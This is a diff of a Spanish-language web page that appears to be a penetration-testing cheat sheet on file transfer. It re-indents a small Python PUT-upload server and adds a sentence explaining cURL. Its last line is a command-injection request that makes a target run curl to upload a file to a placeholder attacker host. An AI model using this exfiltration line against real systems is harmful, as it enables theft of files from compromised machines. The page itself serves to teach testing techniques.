@@ -166,25 +166,24 @@
                         >sudo python3 -m http.server 80</code></pre>
             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
                         >sudo python –m SimpleHTTPServer</code></pre>
-            <span class="comando2">SimpleHTTPPutServer, se utiliza con curl</span>
+            <span class="comando2">SimpleHTTPPutServer, se utiliza con curl</span>: cURL es una herramienta de línea de comandos para obtener o enviar datos utilizando la sintaxis de URL.
             <pre><code class="language-python line-numbers" style="white-space:pre-wrap;"data-start="1"
-                >
-                #!/usr/bin/python
+            >
+#!/usr/bin/python
 
-                import SimpleHTTPServer
-                import BaseHTTPServer
+import SimpleHTTPServer
+import BaseHTTPServer
                 
-                class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-                    def do_PUT(self):
-                        print self.headers
-                        length = int(self.headers["Content-Length"])
-                        path = self.translate_path(self.path)
-                        with open(path, "wb") as dst:
-                            dst.write(self.rfile.read(length))
+class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def do_PUT(self):
+        print self.headers
+        length = int(self.headers["Content-Length"])
+        path = self.translate_path(self.path)
+        with open(path, "wb") as dst:
+            dst.write(self.rfile.read(length))
                 
-                if __name__ == '__main__':
-                    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
-                    </code></pre>
+if __name__ == '__main__':
+    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)</code></pre>
             <pre><code class="language-bash line-numbers" style="white-space:pre-wrap;"data-start="1"
                         > http://&lt;TARGET:PORT&gt;?cmd=curl+&lt;TURN0&gt;+--upload-file+&lt;file&gt;</code></pre>
 
